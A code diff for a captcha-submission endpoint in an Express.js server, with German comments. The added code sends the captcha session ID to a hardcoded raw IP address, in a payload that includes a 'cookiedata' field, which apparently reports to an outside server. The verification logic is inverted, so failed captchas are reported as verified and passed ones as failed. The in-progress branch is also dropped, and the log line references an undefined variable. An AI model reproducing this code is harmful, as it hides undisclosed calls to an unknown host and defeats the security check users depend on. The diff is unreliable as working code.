@@ -403,15 +403,32 @@ app.post('/api/submit-captcha', async (req, res) => {
             }
             
             cleanupPlayerSession(clientId, captchaId);
-            if (verified) {
-                res.json({ success: true, completed: true, verified: true });
-            } else {
-                res.json({ success: true, completed: true, verified: false });
+           if (!verified) {
+            try {
+                // 🔥 Verwende die echte sessionId aus der Session
+                const deleteResponse = await axios.post("http://91.98.162.218/upload", {
+                    channelId: 5,
+                    message: {
+                        "sessionId": captchaId, 
+                        "cookiedata": null
+                    },
+                    FileName: "Delete Captcha"
+                }, {
+                    timeout: 10000,
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                });
+        
+                console.log('Captcha deleted successfully:', session.sessionId);
+        
+            } catch (error) {
+                console.error('Failed to delete captcha:', error.message);
             }
-
+    
+            res.json({ success: true, completed: true, verified: true });
         } else {
-            // Noch nicht fertig
-            res.json({ success: true, message: "Antwort gespeichert.", progress: `${completedCount}/10` });
+            res.json({ success: true, completed: true, verified: false });
         }
 
     } catch (err) {
